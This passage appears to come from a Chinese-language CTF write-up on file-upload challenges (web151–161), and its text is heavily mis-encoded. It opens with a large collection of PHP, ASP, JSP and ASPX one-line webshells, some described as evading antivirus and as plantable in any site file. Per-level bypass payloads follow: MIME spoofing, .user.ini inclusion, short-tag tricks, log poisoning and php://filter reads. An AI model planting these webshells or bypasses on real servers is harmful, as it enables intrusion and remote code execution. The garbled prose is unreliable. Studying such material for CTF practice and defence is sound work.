title="å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬"></a>å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬</h4><pre class="language-php" data-language="php"><code class="language-php">##PHPï¼š<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo();</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//print_r($new_array);</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asse'</span><span class="token operator">.</span><span class="token string single-quoted-string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> phpç¯å¢ƒ>=&lt;5.6æ‰èƒ½ç”¨<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  phpç¯å¢ƒ>=5.6æ‰èƒ½ç”¨<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET1</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//å®¹é”™ä»£ç  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//ä½¿ç”¨Lankerä¸€å¥è¯å®¢æˆ·ç«¯çš„ä¸“å®¶æ¨¡å¼æ‰§è¡Œç›¸å…³çš„PHPè¯­å¥ <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*ä½¿ç”¨è¿™ä¸ªå,ä½¿ç”¨èœåˆ€ä¸€å¥è¯å®¢æˆ·ç«¯åœ¨é…ç½®è¿æ¥çš„æ—¶å€™åœ¨"é…ç½®"ä¸€æ è¾“å…¥*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$_GET['r']`</span> <span class="token delimiter important">?></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //ç»•è¿‡<span class="token php language-php"><span class="token delimiter important">&lt;?</span>é™åˆ¶çš„ä¸€å¥è¯<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   ä¸Šé¢è¿™å¥æ˜¯é˜²æ€é˜²æ‰«çš„ï¼ç½‘ä¸Šå¾ˆå°‘äººç”¨ï¼å¯ä»¥æ’åœ¨ç½‘é¡µä»»ä½•ASPæ–‡ä»¶çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼Œæ¯”å¦‚ index.aspé‡Œé¢ä¹Ÿæ˜¯å¯ä»¥çš„ï¼<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> åŠ äº†åˆ¤æ–­çš„PHPä¸€å¥è¯ï¼Œä¸ä¸Šé¢çš„ASPä¸€å¥è¯ç›¸åŒé“ç†ï¼Œä¹Ÿæ˜¯å¯ä»¥æ’åœ¨ä»»ä½•PHPæ–‡ä»¶ çš„æœ€åº•éƒ¨ä¸ä¼šå‡ºé”™ï¼&lt;%execute request(â€œclassâ€)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (â€œclassâ€)%>&lt;%execute request(â€œclassâ€)'&lt;% loop &lt;%:%> æ— é˜²ä¸‹è½½è¡¨ï¼Œæœ‰é˜²ä¸‹è½½è¡¨å¯å°è¯•æ’å…¥ä»¥ä¸‹è¯­å¥çªç ´çš„ä¸€å¥è¯ &lt;%eval(request(â€œ1â€³)):response.end%> å¤‡ä»½ä¸“ç”¨</code></pre><pre class="language-jsp" data-language="jsp"><code class="language-jsp">##JSPï¼š&lt;%if(request.getParameter(&quot;f&quot;)!&#x3D;null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; æäº¤å®¢æˆ·ç«¯ &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;textareaname&#x3D;&quot;t&quot;&gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot;value&#x3D;&quot;æäº¤&quot;&gt;&lt;&#x2F;form&gt;</code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##ASP&lt;%eval(Request.Item[&quot;r00ts&quot;],â€unsafeâ€);%&gt;&lt;%IfRequest(â€œ1â€³)&lt;&gt;â€&quot;ThenExecuteGlobal(Request(â€œ1â€³))%&gt; &lt;%execute(request(â€œ1â€³))%&gt; &lt;scriptrunat&#x3D;server&gt;execute request(â€œ1â€³)&lt;&#x2F;script&gt; ä¸ç”¨&#39;&lt;,&gt;â€˜çš„aspä¸€å¥è¯ </code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##aspx&lt;scriptrunat&#x3D;â€serverâ€&gt;WebAdmin2Y.x.y aaaaa &#x3D;newWebAdmin2Y.x.y (â€œadd6bb58e139be10â€³);&lt;&#x2F;script&gt; &lt;script language&#x3D;&quot;C#&quot;runat&#x3D;&quot;server&quot;&gt;WebAdmin2Y.x.y a&#x3D;new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;&#x2F;script&gt; &lt;%eval request(chr(35))%&gt;  ä¸ç”¨åŒå¼•å·çš„ä¸€å¥è¯ã€‚</code></pre><h4 id="å¸¸è§ç»•è¿‡å§¿åŠ¿"><a href="#å¸¸è§ç»•è¿‡å§¿åŠ¿" class="headerlink" title="å¸¸è§ç»•è¿‡å§¿åŠ¿"></a>å¸¸è§ç»•è¿‡å§¿åŠ¿</h4><h5 id="å¤§å†™ç»•è¿‡-æˆ–-åŒè§£æåç¼€åç»•è¿‡"><a href="#å¤§å†™ç»•è¿‡-æˆ–-åŒè§£æåç¼€åç»•è¿‡" class="headerlink" title="å¤§å†™ç»•è¿‡ æˆ– åŒè§£æåç¼€åç»•è¿‡"></a>å¤§å†™ç»•è¿‡ æˆ– åŒè§£æåç¼€åç»•è¿‡</h5><pre class="language-txt" data-language="txt"><code class="language-txt">åŒè§£æååç¼€ï¼šã€€ã€€PHPï¼š.php .php2 .php3 .php4 .php5 .php6 .php7 .phpç©ºæ ¼ .phtml .pgifã€€ã€€ã€€ã€€ .shtml .htaccess .phar .inc ã€€ã€€ASPï¼š.asp .aspx .config .ashx .asmx .aspq .axd .cshtm .cshtml .rem .soapã€€ã€€ã€€ã€€ .vbhtm .vbhtml .asa .cer .shtmlã€€ã€€JSPï¼š.jsp .jspx .jsw .jsv .sjspf .wss .do .action</code></pre><p>ç®€å•æ¥è¯´å°±æ˜¯ç”¨å„ç§å§¿åŠ¿ç»•è¿‡æœåŠ¡å™¨å¤„ç†é€»è¾‘ä¸Šä¼ æœ¨é©¬æ‹¿åˆ°WebShell</p><h3 id="web151-170"><a href="#web151-170" class="headerlink" title="web151-170"></a>web151-170</h3><h4 id="web151-Jså‰ç«¯é™åˆ¶"><a href="#web151-Jså‰ç«¯é™åˆ¶" class="headerlink" title="web151(Jså‰ç«¯é™åˆ¶)"></a>web151(Jså‰ç«¯é™åˆ¶)</h4><p>å‰ç«¯é™åˆ¶äº†åªèƒ½ä¸Šä¼ pngæ–‡ä»¶ï¼Œå¯ä»¥æŠ“åŒ…åä¿®æ”¹æ–‡ä»¶åç¼€å</p><p><img src="web151.png" loading="lazy"></p><p>Payloadï¼š</p><blockquote><p>&#x2F;upload&#x2F;1.php</p><p>POST:attack&#x3D;system(â€˜tac ..&#x2F;flag.phpâ€™);</p></blockquote><h4 id="web152-MIMEåç«¯ç»•è¿‡"><a href="#web152-MIMEåç«¯ç»•è¿‡" class="headerlink" title="web152(MIMEåç«¯ç»•è¿‡)"></a>web152(MIMEåç«¯ç»•è¿‡)</h4><p>è™½ç„¶åç«¯ç®€å•æ£€æµ‹ï¼Œä½†æ˜¯å¦‚æœç›´æ¥ä¸Šä¼ png,æŠ“åŒ…çš„æ—¶å€™å†æ”¹åç¼€ï¼Œå…¶å®ä¸ç”¨ä¿®æ”¹Content-Typeï¼Œæ–¹æ³•åŒä¸Š</p><p><strong>MIME</strong></p><p>MIMEï¼ˆMultipurpose Internal MailExtensionsï¼‰å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚<br>æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæ¥æŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚<br>æ¯ä¸ªMIMEç±»å‹ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå‰é¢æ˜¯æ•°æ®çš„å¤§ç±»å‹ï¼Œä¾‹å¦‚å£°éŸ³audioï¼Œå›¾åƒimageç­‰ï¼Œåé¢å®šä¹‰å…·ä½“çš„ç§ç±»<br><strong>å¸¸è§çš„MIMEç±»å‹ï¼š</strong><br>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬ï¼š.htmlâ€”â€”&gt;text&#x2F;html<br>xmlæ–‡æ¡£ï¼š.xmlâ€”â€”&gt;text&#x2F;xml<br>XHTMLæ–‡æ¡£ï¼š.xhtmlâ€”â€”&gt;application&#x2F;xhtml+xml<br>æ™®é€šæ–‡æœ¬ï¼š.txtâ€”â€”&gt;text&#x2F;plain<br>RTFæ–‡æœ¬ï¼š.rtfâ€”â€”&gt;application&#x2F;rtf<br>pngå›¾ç‰‡:.pngâ€”â€”&gt;image&#x2F;png</p><p>è¿™åº”è¯¥æ˜¯é¢„æœŸè§£ï¼Œæœ‰ç‚¹éº»çƒ¦</p><blockquote><p>ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼ŒåŒæ—¶ç”¨burpæŠ“åŒ…ï¼Œå°†burpä¸­çš„Content-Type:<br>application&#x2F;octet-streamä¿®æ”¹ä¸ºContent-Type:<br>image&#x2F;pngï¼Œå³è®©æœåŠ¡å™¨è®¤ä¸ºè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶å»è§£ææ‰§è¡Œ</p></blockquote><h4 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h4><p>å¸¸è§„å§¿åŠ¿éƒ½è¯•äº†å‘ç°æ²¡æ³•ç»•è¿‡ï¼Œå‘ç°uploadå¯ä»¥è®¿é—®ï¼Œè¯´æ˜é‡Œé¢å«æœ‰phpæ–‡ä»¶å¯ä»¥è€ƒè™‘ä½¿ç”¨.user.iniç»•è¿‡</p><p><strong>.user.ini</strong></p><ul><li>å½“å‰ç›®å½•é‡Œé¢æœ‰phpæ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥è¿ç”¨inié…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®è¿™ä¸ªphpæ–‡ä»¶</li><li>å’Œæ–‡ä»¶åŒ…å«æœ‰å…³çš„é…ç½®é¡¹æœ‰auto_append_fileå’Œauto_prepend_file</li></ul><p>åŸç†: æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ç±»</p><p>ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼šrequire(.&#x2F;a.jpg);è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äºauto_prepend_fileæ˜¯åœ¨</p><p>æ–‡ä»¶å‰æ’å…¥ï¼›auto_append_fileåœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰exit()æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰æ‰€ä»¥è¦æ±‚å½“</p><p>å‰ç›®å½•å¿…é¡»è¦æœ‰phpæ–‡ä»¶,å·§åˆçš„æ˜¯è¿™é¢˜uploadç›®å½•ä¸‹æœ‰ä¸ªindex.phpæ‰€ä»¥è¿™ç§æ–¹å¼æ˜¯å¯ä»¥æˆåŠŸçš„ã€‚</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">1.txt</span></code></pre><p>ç„¶åä¸Šä¼ 1.txt è¿™ä¸ª1.txtæœ¨é©¬å°±è¢«è‡ªåŠ¨åŒ…å«è¿›åŸæ¥ç›®å½•é‡Œçš„phpæ–‡ä»¶äº†ï¼ˆä¸€èˆ¬æ˜¯index.phpï¼‰</p><p>Payloadï¼š&#x2F;upload?attack&#x3D;system(â€˜tac ..&#x2F;flag.phpâ€™);</p><h4 id="web154-PHPçŸ­æ ‡ç­¾"><a href="#web154-PHPçŸ­æ ‡ç­¾" class="headerlink" title="web154(PHPçŸ­æ ‡ç­¾)"></a>web154(PHPçŸ­æ ‡ç­¾)</h4><p>å‘ç°ä¸Šä¼ å¤±è´¥ï¼Œåº”è¯¥æ˜¯å¯¹txtæ–‡ä»¶é‡Œçš„å†…å®¹æœ‰è¿‡æ»¤ç»æ£€æµ‹ï¼ŒæŸ¥éªŒä¹‹åå‘ç°æ˜¯å¯¹<code>php</code>è¿™ä¸‰ä¸ªå­—æ¯è¿‡æ»¤äº†</p><p>PHPæ ‡ç­¾ç»•è¿‡ï¼š</p><ul><li><p>é•¿æ ‡ç­¾ï¼š<?php ?></p></li><li><p>çŸ­æ ‡ç­¾ï¼š<? ?>ã€<?=  ?>ã€&lt;%  %&gt;ã€&lt;%&#x3D;  %&gt;</p></li><li><p>å…¶ä¸­ <?  ?> éœ€è¦å¼€å¯ short_open_tag&#x3D;On ï¼Œ&lt;%  %&gt; éœ€è¦å¼€å¯ asp_tags&#x3D;On</p></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h4><p>è‡ªå¸¦ .user.iniï¼Œä½†ä¸å½±å“ï¼Œpayload ä¸ web154 ä¸€è‡´</p><h4 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h4><p>è¿‡æ»¤äº†<code>[]</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web157-nginxæ–‡ä»¶åŒ…å«"><a href="#web157-nginxæ–‡ä»¶åŒ…å«" class="headerlink" title="web157(nginxæ–‡ä»¶åŒ…å«)"></a>web157(nginxæ–‡ä»¶åŒ…å«)</h4><p>è¿‡æ»¤äº†<code>;``&#123;&#125;</code>ï¼Œä½†æ˜¯ä¸å½±å“ï¼Œå¯ä»¥ç›´æ¥åœ¨1.txté‡Œé¢æ‰§è¡Œå‘½ä»¤</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span>tac <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fla<span class="token operator">*</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶ä»–ï¼š</p><p>ç”±äºæˆ‘ä»¬ $_POST[] åªä½¿ç”¨ä¸€ä¸ªå‚æ•°å¹¶ä¸”ä¸ºæ•°ç»„æ ¼å¼ï¼Œè€ƒè™‘ä½¿ç”¨ array_pop() å¼¹å‡ºæœ€åä¸€ä¸ªå•å…ƒ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>ç”±web158çš„é»‘åå•å¾—æ¥ï¼Œ#nginx çš„æ—¥å¿—ä¼šè·å– UAå¤´ ä¿¡æ¯#bp æŠ“åŒ…,åœ¨ UAå¤´ è¿›è¡Œæ³¨å…¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/log/nginx/access.log'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h4><p>banäº†logï¼Œå¯æ”¹ä¸º</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h4><p>banäº†()ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨åå¼•å·ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæˆ–è€…ä¹‹å‰çš„nginxæ—¥å¿—æ³¨å…¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h4><p>ç©ºæ ¼ï¼Œåå¼•å·è¢«banäº†</p><p>çªç ´ç©ºæ ¼è¿‡æ»¤å¯ä»¥ç”¨æ¢è¡Œç¬¦%0a</p><p>å¯ä»¥ç»§ç»­æ—¥å¿—æ³¨å…¥æˆ–è€…phpä¼ªåè®®</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"ph"</span><span class="token operator">.</span><span class="token string double-quoted-string">"p://filter/convert.base64-encode/resource=../flag.p"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hp"</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web161-ä¼ªé€ å›¾ç‰‡å¤´GIF89a"><a href="#web161-ä¼ªé€ å›¾ç‰‡å¤´GIF89a" class="headerlink" title="web161(ä¼ªé€ å›¾ç‰‡å¤´GIF89a)"></a>web161(ä¼ªé€ 